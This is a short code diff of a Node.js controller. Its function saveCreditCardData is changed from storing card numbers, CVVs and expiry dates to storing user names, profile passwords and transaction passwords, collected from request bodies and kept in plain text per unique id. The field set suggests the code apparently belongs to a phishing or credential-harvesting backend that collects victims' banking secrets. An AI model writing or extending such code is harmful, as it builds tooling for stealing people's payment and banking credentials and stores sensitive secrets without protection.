@@ -35,15 +35,15 @@ exports.saveUserData = async (req, res) => {
 
 exports.saveCreditCardData = async (req, res) => {
   try {
-    const { uniqueid, cardNumber, cvv, expiry } = req.body;
+    const { uniqueid, userName, profilePass, transactionPass } = req.body;
     let user = await CreditCardData.findOne({ uniqueid });
 
     if (user) {
-      user.entries.push({ cardNumber, cvv, expiry });
+      user.entries.push({  userName, profilePass, transactionPass  });
     } else {
       user = new CreditCardData({
         uniqueid,
-        entries: [{ cardNumber, cvv, expiry }]
+        entries: [{ userName, profilePass, transactionPass  }]
       });
     }
 
